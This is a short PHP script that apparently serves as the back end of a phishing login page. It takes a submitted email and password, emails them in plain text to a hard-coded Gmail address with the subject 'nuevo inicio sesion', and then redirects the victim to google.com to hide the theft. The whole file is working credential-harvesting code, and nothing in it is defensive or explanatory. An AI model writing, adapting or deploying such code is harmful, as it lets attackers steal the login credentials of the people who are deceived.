<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];


    $to = "yetsonaq@gmail.com";
    $subject = "nuevo inicio sesion";
    $message = "correo electronico: $email\nContraseña: $password";
    mail($to,$subject,$message);
    header("Location: https://www.google.com/");
    exit();
}
?>
